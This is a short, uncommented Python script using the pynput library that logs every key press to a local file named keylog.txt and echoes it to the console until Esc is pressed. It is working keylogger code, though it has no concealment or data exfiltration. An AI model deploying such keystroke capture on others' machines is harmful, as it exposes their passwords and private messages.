from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        print(f"Key pressed: {key.char}")
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        print(f"Special key pressed: {key}")
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key.name}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
